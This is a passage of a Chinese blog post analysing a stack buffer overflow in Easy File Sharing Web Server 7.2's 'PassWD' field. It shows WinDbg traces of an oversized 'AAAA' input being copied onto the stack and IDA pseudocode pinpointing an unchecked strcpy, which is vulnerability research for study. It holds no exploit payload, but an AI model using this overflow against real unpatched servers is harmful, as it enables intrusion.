@............n..</div><div class="line">01ba6e60  01ba6eac 00000000 00000008 0052d537  .n..........7.R.</div><div class="line">01ba6e70  01ba718c 0054f033 00000009 0042b2ec  .q..3.T.......B.</div><div class="line">01ba6e80  012f46b0 012f4740 011347a0 00000000  .F/.@G/..G......</div><div class="line">01ba6e90  01ba7624 0012b9d0 01ba7240 00000200  $v......@r......</div><div class="line">01ba6ea0  012f8fac 0093003d 01133bd8 011343e0  ../.=....;...C..</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000012 edx=012f46b0 esi=012f46b4 edi=01ba6e34</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; dc esi</div><div class="line">012f46b4  413d4457 41414141 41414141 41414141  WD=AAAAAAAAAAAAA</div><div class="line">012f46c4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46d4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46e4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">012f46f4  41414141 41414141 00000041 00000000  AAAAAAAAA.......</div><div class="line">012f4704  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4714  00000000 00000000 00000000 00000000  ................</div><div class="line">012f4724  00000000 00000000 00000000 00000000  ................</div><div class="line">0:004&gt; dc edi</div><div class="line">01ba6e34  ffffffff 7c80be76 0052dc3f 011343e0  ....v..|?.R..C..</div><div class="line">01ba6e44  01ba6eac 00522d39 ffffffff 0012c740  .n..9-R.....@...</div><div class="line">01ba6e54  00000000 0012b90d 01ba6e8c 01ba6eac  .........n...n..</div><div class="line">01ba6e64  00000000 00000008 0052d537 01ba718c  ........7.R..q..</div><div class="line">01ba6e74  0054f033 00000009 0042b2ec 012f46b0  3.T.......B..F/.</div><div class="line">01ba6e84  012f4740 011347a0 00000000 01ba7624  @G/..G......$v..</div><div class="line">01ba6e94  0012b9d0 01ba7240 00000200 012f8fac  ....@r......../.</div><div class="line">01ba6ea4  0093003d 01133bd8 011343e0 0131b05c  =....;...C..\.1.</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000011 edx=012f46b0 esi=012f46b8 edi=01ba6e38</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000010 edx=012f46b0 esi=012f46bc edi=01ba6e3c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000f edx=012f46b0 esi=012f46c0 edi=01ba6e40</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000e edx=012f46b0 esi=012f46c4 edi=01ba6e44</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000d edx=012f46b0 esi=012f46c8 edi=01ba6e48</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000c edx=012f46b0 esi=012f46cc edi=01ba6e4c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000b edx=012f46b0 esi=012f46d0 edi=01ba6e50</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=0000000a edx=012f46b0 esi=012f46d4 edi=01ba6e54</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000009 edx=012f46b0 esi=012f46d8 edi=01ba6e58</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000008 edx=012f46b0 esi=012f46dc edi=01ba6e5c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000007 edx=012f46b0 esi=012f46e0 edi=01ba6e60</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000006 edx=012f46b0 esi=012f46e4 edi=01ba6e64</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000005 edx=012f46b0 esi=012f46e8 edi=01ba6e68</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000004 edx=012f46b0 esi=012f46ec edi=01ba6e6c</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000003 edx=012f46b0 esi=012f46f0 edi=01ba6e70</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000002 edx=012f46b0 esi=012f46f4 edi=01ba6e74</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">Breakpoint 0 hit</div><div class="line">eax=0000004e ebx=00000000 ecx=00000001 edx=012f46b0 esi=012f46f8 edi=01ba6e78</div><div class="line">eip=00412cc7 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010203</div><div class="line">fsws+0x12cc7:</div><div class="line">00412cc7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line">0:004&gt; p</div><div class="line">eax=0000004e ebx=00000000 ecx=00000000 edx=012f46b0 esi=012f46fc edi=01ba6e7c</div><div class="line">eip=00412cc9 esp=01ba6d60 ebp=ffffffff iopl=0         nv up ei pl nz na po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203</div><div class="line">fsws+0x12cc9:</div><div class="line">00412cc9 8bc8            mov     ecx,eax</div><div class="line">0:004&gt; dc edi-50</div><div class="line">01ba6e2c  7c839ac0 73736150 413d4457 41414141  ...|PassWD=AAAAA</div><div class="line">01ba6e3c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e4c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e5c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e6c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</div><div class="line">01ba6e7c  0042b2ec 012f46b0 012f4740 011347a0  ..B..F/.@G/..G..</div><div class="line">01ba6e8c  00000000 01ba7624 0012b9d0 01ba7240  ....$v......@r..</div><div class="line">01ba6e9c  00000200 012f8fac 0093003d 01133bd8  ....../.=....;..</div></pre></td></tr></table></figure></p>
+<p>上面是数据拷贝，并且esi就是开头的参数,012f46b0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">......省略</div><div class="line">0:004&gt; dd esp</div><div class="line">01ba6e7c  0042b2ec 012f46b0 012f4740 011345c0</div><div class="line">01ba6e8c  00000000 01ba7624 0012b9d0 01ba7240</div><div class="line">01ba6e9c  00000200 012f8fac 0093003d 01133bd8</div><div class="line">01ba6eac  011345c0 0131b05c 00000000 01134520</div><div class="line">01ba6ebc  0019a8e8 005a38e8 005a38e8 01ba6e88</div><div class="line">01ba6ecc  01ba6eb0 0012b9d0 01ba6e80 01ba6e84</div><div class="line">01ba6edc  003eaf18 015a12c0 ffffff00 01134480</div><div class="line">01ba6eec  005a38e8 003e0000 01133bd8 003eaf00</div><div class="line">......省略</div></pre></td></tr></table></figure></p>
+<p>可以观察下ida伪代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">int __thiscall sub_412A50(void *this, int a2, unsigned __int8 *a3, char a4, char a5)</div><div class="line">&#123;</div><div class="line">  _DWORD *v5; // edi@1</div><div class="line">  int v6; // esi@1</div><div class="line">  signed int v7; // eax@5</div><div class="line">  int v8; // eax@6</div><div class="line">  void *v9; // eax@8</div><div class="line">  CHAR *v10; // eax@10</div><div class="line">  int v11; // esi@13</div><div class="line">  void *v12; // eax@15</div><div class="line">  const CHAR *v13; // ecx@16</div><div class="line">  int result; // eax@18</div><div class="line">  CHAR *v15; // eax@25</div><div class="line">  void *v16; // eax@36</div><div class="line">  CHAR *v17; // eax@37</div><div class="line">  const char **v18; // eax@44</div><div class="line">  int v19; // esi@44</div><div class="line">  const char **v20; // eax@46</div><div class="line">  int v21; // esi@46</div><div class="line">  const char **v22; // eax@47</div><div class="line">  int v23; // esi@47</div><div class="line">  const CHAR *v24; // ecx@48</div><div class="line">  int v25; // esi@51</div><div class="line">  int v26; // esi@56</div><div class="line">  int v27; // esi@58</div><div class="line">  int v28; // esi@59</div><div class="line">  int v29; // esi@61</div><div class="line">  ......省略</div><div class="line">LABEL_53:</div><div class="line">      v53 = -1;</div><div class="line">      sub_52D7A7(&amp;a4);</div><div class="line">      return -1;</div><div class="line">    &#125;</div><div class="line">    v10 = sub_498AB0(&amp;v50, aAccess);</div><div class="line">    sub_52D815(v10);</div><div class="line">    LOBYTE(v53) = 8;</div><div class="line">    v47 = 0;</div><div class="line">    sub_498490(&amp;v47, 0);</div><div class="line">    sub_496CC0(&amp;v51);</div><div class="line">    v34 = *(const char **)(v6 + 3444);</div><div class="line">    LOBYTE(v53) = 9;</div><div class="line">    sub_522D43((int)&amp;v35, aSvfolder_user_, (int)v34);</div><div class="line">    if ( (unsigned __int8)sub_4971A0((LPCSTR)v35, 0) )</div><div class="line">    &#123;</div><div class="line">      *(_DWORD *)v40 = strcpy(&amp;v52, (const char *)a2); //这里的a2参数直接传入</div></pre></td></tr></table></figure></p>
+<p>内存拷贝时没有做限制，esp+110处的地址被覆盖为0x41414141,最终esi引用了无效地址触发异常。可以看到整个过程非常简单，但是代码量太多了。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/path/toge/wechat-reward-image" alt="hackyzh WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/path/to/alipay-reward-ima" alt="hackyzh Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/30/windows内核漏洞学习篇-任意地址写/" rel="next" title="windows内核漏洞学习篇-任意地址写">
+                <i class="fa fa-chevron-left"></i> windows内核漏洞学习篇-任意地址写
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="ds-share flat" data-thread-key="2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/"
+     data-title="Easy File Sharing Web Server 7.2 - Buffer Overflow 分析"
+     data-content=""
+     data-url="http://yoursite.com/2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/"
+           data-title="Easy File Sharing Web Server 7.2 - Buffer Overflow 分析" data-url="http://yoursite.com/2017/07/01/Easy-File-Sharing-Web-Server-7-2-"PassWD"-Buffer-Overflow-分析/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="hackyzh" />
+          <p class="site-author-name" itemprop="name">hackyzh</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">22</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/3803148235/profile?topnav=1&wvr=6" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://douban.com/" target="_blank" title="豆瓣">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  豆瓣
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one" title="One Thief" target="_blank">One Thief</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.jusene.me" title="Jusenes' blog" target="_blank">Jusenes' blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kongdewei.cn" title="caomei'blog" target="_blank">caomei'blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、漏洞环境"><span class="nav-number">1.</span> <span class="nav-text">一、漏洞环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">二、漏洞分析</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hackyzh</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"whiteHat001"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = true;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = data.url;
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '' && data_content != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title < 0 && index_content < 0 ){
+                                isMatch = false;
+                            } else {
+                                if (index_content < 0) {
+                                    index_content = 0;
+                                }
+                                if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            }
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
